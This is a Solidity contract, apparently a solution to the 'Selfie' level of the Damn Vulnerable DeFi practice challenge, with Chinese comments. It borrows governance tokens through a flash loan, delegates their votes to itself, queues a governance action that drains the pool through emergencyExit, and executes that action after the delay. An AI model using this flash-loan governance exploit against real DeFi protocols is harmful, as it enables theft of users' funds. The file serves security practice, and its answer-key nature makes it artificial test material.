// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity =0.8.25;

import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
// 需要接口
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract SelfieRescueReceiver {
    SelfiePool pool;
    DamnValuableVotes token;
    SimpleGovernance governance;
    uint actionId;


    constructor(address _pool, address _token, address _governance) {
        pool = SelfiePool(_pool);
        token = DamnValuableVotes(_token);
        governance = SimpleGovernance(_governance);
    }

    // @enter 入口
    function rescue(address _receiver, uint256 _amount) public {
        // emergencyExit 必须由 governance 合约调用，calldata 方式
        bytes memory data = abi.encodeCall(SelfiePool.emergencyExit, (_receiver));
        // 需要满足 IERC3156FlashBorrower 接口，进行转换
        pool.flashLoan(IERC3156FlashBorrower(address(this)), address(token), _amount, data);

    }

    function onFlashLoan(
        address _addr, 
        address _token, 
        uint256 _amount,
        uint256 _fee, 
        bytes calldata _data
    )  
        public 
        returns(bytes32)
    {
        // !可以执行任意逻辑

        // ?? 治理 ERC20Votes 逻辑
        // 本合约 为 delegatee
        // 使用token投票，投票数为 1500000e18
        token.delegate(address(this));

        uint _actionId = governance.queueAction(
            address(pool), // 调用合约地址
            0,
            _data // calldata
        );
        actionId = _actionId;

        // 还款授权
        token.approve(address(pool), _amount + _fee);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function rescueAfterWait() public {
        // 等待指定 timestamp后，才能执行
        governance.executeAction(actionId);
    }
}